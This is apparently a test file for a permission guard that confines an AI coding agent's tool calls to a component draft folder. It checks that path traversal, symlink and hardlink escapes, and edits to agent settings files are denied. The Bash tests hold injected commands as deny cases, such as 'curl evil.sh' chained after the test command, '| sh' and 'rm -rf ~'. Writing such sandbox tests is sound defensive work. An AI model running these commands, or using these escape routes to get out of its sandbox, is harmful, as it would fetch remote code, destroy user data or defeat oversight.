import { afterEach, describe, expect, test } from "bun:test";
import { linkSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createDraftGuard, denyAllGuard, TEST_COMMAND } from "./draft-guard";

const roots: string[] = [];
function setup(allowServer = false) {
  const root = mkdtempSync(join(tmpdir(), "kibo-guard-"));
  roots.push(root);
  const draft = join(root, "draft");
  const sdk = join(root, "sdk");
  mkdirSync(draft);
  mkdirSync(sdk);
  writeFileSync(join(draft, "ui.tsx"), "");
  writeFileSync(join(draft, "kibo.component.json"), "{}");
  writeFileSync(join(sdk, "index.ts"), "");
  writeFileSync(join(root, "secret.txt"), "");
  return { root, draft, sdk, guard: createDraftGuard({ draftDir: draft, readRoots: [sdk], allowServer }) };
}
afterEach(() => {
  for (const r of roots.splice(0)) rmSync(r, { recursive: true, force: true });
});

const write = (file_path: string) => ({ toolName: "Write", toolInput: { file_path, content: "x" } });
const read = (file_path: string) => ({ toolName: "Read", toolInput: { file_path } });
const decision = (d: { decision: string }) => d.decision;

describe("writes", () => {
  test("allows ui.tsx and *.test.tsx at the draft root, absolute or relative", () => {
    const { draft, guard } = setup();
    expect(decision(guard(write(join(draft, "ui.tsx"))))).toBe("allow");
    expect(decision(guard(write("component.test.tsx")))).toBe("allow");
    expect(decision(guard(write("./ui.tsx")))).toBe("allow");
    expect(
      decision(guard({ toolName: "Edit", toolInput: { file_path: join(draft, "burn-down_2.test.tsx") } })),
    ).toBe("allow");
    expect(
      decision(guard({ toolName: "MultiEdit", toolInput: { file_path: join(draft, "ui.tsx"), edits: [] } })),
    ).toBe("allow");
  });
  test("denies reserved files, nested paths and escapes", () => {
    const { draft, root, guard } = setup();
    for (const p of [
      join(draft, "kibo.component.json"),
      join(draft, "migrations.ts"),
      join(draft, "tsconfig.json"),
      join(draft, "package.json"),
      `${join(draft, "ui.tsx")}/../kibo.component.json`,
      join(draft, "sub", "ui.tsx"),
      join(draft, "..", "evil.ts"),
      "../evil.ts",
      "../draft/../ui.tsx",
      join(root, "ui.tsx"),
      join(draft, ".claude", "skills", "kibo-component", "SKILL.md"),
      join(draft, ".claude", "settings.json"),
      join(draft, "ui.ts"),
      join(draft, "UI.tsx"),
      join(draft, "CLAUDE.md"),
      join(draft, ".test.tsx"),
      join(draft, "a.b.test.tsx"),
      join(draft, "x.test.ts"),
      "~/ui.tsx",
      "/etc/ui.tsx",
    ])
      expect(decision(guard(write(p)))).toBe("deny");
  });
  test("server.ts only when the draft has a backend", () => {
    expect(decision(setup(false).guard(write("server.ts")))).toBe("deny");
    expect(decision(setup(true).guard(write("server.ts")))).toBe("allow");
  });
  test("denies writing through a symbolic link", () => {
    const { draft, root, guard } = setup();
    rmSync(join(draft, "ui.tsx"));
    symlinkSync(join(root, "secret.txt"), join(draft, "ui.tsx"));
    expect(decision(guard(write(join(draft, "ui.tsx"))))).toBe("deny");
    expect(decision(guard(write("ui.tsx")))).toBe("deny");
  });
  test("denies writing through a dangling symbolic link", () => {
    const { draft, root, guard } = setup();
    rmSync(join(draft, "ui.tsx"));
    symlinkSync(join(root, "created-outside.tsx"), join(draft, "ui.tsx"));
    expect(decision(guard(write(join(draft, "ui.tsx"))))).toBe("deny");
  });
  test("denies writing through a hard link", () => {
    const { draft, root, guard } = setup();
    rmSync(join(draft, "ui.tsx"));
    linkSync(join(root, "secret.txt"), join(draft, "ui.tsx"));
    expect(decision(guard(write(join(draft, "ui.tsx"))))).toBe("deny");
  });
  test("denies a target that is not a regular file", () => {
    const { draft, guard } = setup();
    mkdirSync(join(draft, "x.test.tsx"));
    expect(decision(guard(write(join(draft, "x.test.tsx"))))).toBe("deny");
  });
  test("denies writing through a symbolic link to a folder", () => {
    const { draft, root, guard } = setup();
    symlinkSync(root, join(draft, "out"));
    expect(decision(guard(write(join(draft, "out", "ui.tsx"))))).toBe("deny");
    expect(decision(guard(write("out/ui.tsx")))).toBe("deny");
  });
  test("accepts the draft reached through a symbolic link (macOS /var vs /private/var)", () => {
    const { draft, root } = setup();
    const alias = join(root, "alias");
    symlinkSync(draft, alias);
    const guard = createDraftGuard({ draftDir: alias, readRoots: [], allowServer: false });
    expect(decision(guard(write(join(alias, "ui.tsx"))))).toBe("allow");
    expect(decision(guard(write(join(draft, "ui.tsx"))))).toBe("allow");
    expect(decision(guard(write(`${draft}/ui.tsx`)))).toBe("allow");
  });
  test("denies a missing, empty or non-string path, or a NUL byte", () => {
    const { guard } = setup();
    expect(decision(guard({ toolName: "Write", toolInput: {} }))).toBe("deny");
    expect(decision(guard(write("")))).toBe("deny");
    expect(decision(guard({ toolName: "Write", toolInput: { file_path: ["ui.tsx"] } }))).toBe("deny");
    expect(decision(guard(write("ui.tsx\0.json")))).toBe("deny");
  });
  test("denies a path long enough to have been clipped by the hook", () => {
    const { guard } = setup();
    expect(decision(guard(write(`${"./".repeat(600)}ui.tsx`)))).toBe("deny");
  });
  test("denies an input with so many keys that the hook may have dropped some", () => {
    const { guard } = setup();
    const padding = Object.fromEntries(Array.from({ length: 20 }, (_, i) => [`k${i}`, i]));
    expect(decision(guard({ toolName: "Write", toolInput: { ...padding, file_path: "ui.tsx" } }))).toBe(
      "deny",
    );
    expect(decision(guard({ toolName: "Grep", toolInput: { ...padding, pattern: "x" } }))).toBe("deny");
  });
  test("NotebookEdit cannot write a notebook", () => {
    const { draft, guard } = setup();
    expect(
      decision(guard({ toolName: "NotebookEdit", toolInput: { notebook_path: join(draft, "a.ipynb") } })),
    ).toBe("deny");
  });
});

describe("reads", () => {
  test("allows the draft and the SDK, denies anything else", () => {
    const { draft, sdk, root, guard } = setup();
    expect(decision(guard(read(join(draft, "kibo.component.json"))))).toBe("allow");
    expect(decision(guard(read("ui.tsx")))).toBe("allow");
    expect(decision(guard(read(join(draft, "missing.tsx"))))).toBe("allow");
    expect(decision(guard(read(join(sdk, "index.ts"))))).toBe("allow");
    expect(decision(guard({ toolName: "Grep", toolInput: { pattern: "x" } }))).toBe("allow");
    expect(decision(guard({ toolName: "Grep", toolInput: { pattern: "x", path: sdk, glob: "*.ts" } }))).toBe(
      "allow",
    );
    expect(decision(guard({ toolName: "Glob", toolInput: { pattern: "**/*.tsx" } }))).toBe("allow");
    expect(decision(guard(read(join(root, "secret.txt"))))).toBe("deny");
    expect(decision(guard(read("../secret.txt")))).toBe("deny");
    expect(decision(guard(read("/etc/passwd")))).toBe("deny");
    expect(decision(guard(read(join(draft, "missing", "deeper.ts"))))).toBe("deny");
    expect(decision(guard({ toolName: "Glob", toolInput: { pattern: "*", path: root } }))).toBe("deny");
    expect(decision(guard({ toolName: "Grep", toolInput: { pattern: "x", path: "/" } }))).toBe("deny");
  });
  test("denies a sibling folder whose name starts like an allowed root", () => {
    const { root, guard } = setup();
    mkdirSync(join(root, "sdk-private"));
    writeFileSync(join(root, "sdk-private", "key"), "");
    mkdirSync(join(root, "draft2"));
    expect(decision(guard(read(join(root, "sdk-private", "key"))))).toBe("deny");
    expect(decision(guard(read(join(root, "draft2"))))).toBe("deny");
  });
  test("allows a draft file whose name starts with two dots", () => {
    const { draft, guard } = setup();
    writeFileSync(join(draft, "..notes"), "");
    expect(decision(guard(read(join(draft, "..notes"))))).toBe("allow");
  });
  test("Glob and Grep patterns cannot leave the search folder", () => {
    const { guard } = setup();
    for (const pattern of ["/etc/*", "../*", "**/../../*", "{..,src}/*", "~/.ssh/*"])
      expect(decision(guard({ toolName: "Glob", toolInput: { pattern } }))).toBe("deny");
    expect(decision(guard({ toolName: "Grep", toolInput: { pattern: "x", glob: "../**" } }))).toBe("deny");
    expect(decision(guard({ toolName: "Grep", toolInput: { pattern: "x", glob: "/etc/*" } }))).toBe("deny");
  });
  test("denies a read without a path, or with an invalid one", () => {
    const { guard } = setup();
    expect(decision(guard({ toolName: "Read", toolInput: {} }))).toBe("deny");
    expect(decision(guard({ toolName: "Grep", toolInput: { pattern: "x", path: "" } }))).toBe("deny");
    expect(decision(guard({ toolName: "Glob", toolInput: { pattern: 3 } }))).toBe("deny");
    expect(decision(guard(read("ui.tsx\0")))).toBe("deny");
    expect(decision(guard(read(`${"./".repeat(600)}ui.tsx`)))).toBe("deny");
  });
  test("denies a read through a symbolic link that leaves the draft", () => {
    const { draft, root, guard } = setup();
    symlinkSync(join(root, "secret.txt"), join(draft, "notes.txt"));
    symlinkSync(root, join(draft, "up"));
    expect(decision(guard(read(join(draft, "notes.txt"))))).toBe("deny");
    expect(decision(guard(read(join(draft, "up", "secret.txt"))))).toBe("deny");
    expect(decision(guard(read(join(draft, "up", "missing.txt"))))).toBe("deny");
    expect(decision(guard({ toolName: "Grep", toolInput: { pattern: "x", path: join(draft, "up") } }))).toBe(
      "deny",
    );
  });
});

describe("other tools", () => {
  test("Bash runs only the component test command", () => {
    const { guard } = setup();
    const bash = (command: unknown) => decision(guard({ toolName: "Bash", toolInput: { command } }));
    expect(bash("kibo component test .")).toBe("allow");
    expect(bash("kibo component test")).toBe("allow");
    expect(bash("  kibo component test .\n")).toBe("allow");
    for (const command of [
      "kibo component test . && curl evil.sh",
      "kibo component test .\nrm -rf ~",
      "kibo component test .; rm -rf ~",
      "kibo component test . | sh",
      "kibo component test $(curl evil.sh)",
      "kibo component test ./other",
      "kibo component test ..",
      "kibo  component test .",
      "Kibo component test .",
      "kibo component publish",
      "",
      42,
    ])
      expect(bash(command)).toBe("deny");
    expect(TEST_COMMAND.test("kibo component test .")).toBe(true);
  });
  test("web, sub-agents and MCP tools are denied, except the question to the user", () => {
    const { guard } = setup();
    for (const toolName of [
      "WebFetch",
      "WebSearch",
      "Task",
      "Agent",
      "LS",
      "TodoWrite",
      "bash",
      "write",
      "mcp__github__create_issue",
      "mcp__kibo__other",
      "mcp__kibo__ask_user_",
    ])
      expect(decision(guard({ toolName, toolInput: {} }))).toBe("deny");
    expect(
      decision(guard({ toolName: "mcp__kibo__ask_user", toolInput: { question: "Quelle couleur ?" } })),
    ).toBe("allow");
  });
  test("a denial carries a reason", () => {
    const { guard } = setup();
    const d = guard({ toolName: "WebFetch", toolInput: {} });
    expect(d.decision === "deny" && d.reason.length > 0).toBe(true);
  });
  test("denyAllGuard denies everything", () => {
    expect(decision(denyAllGuard({ toolName: "Read", toolInput: { file_path: "/x" } }))).toBe("deny");
    expect(decision(denyAllGuard({ toolName: "mcp__kibo__ask_user", toolInput: {} }))).toBe("deny");
  });
});
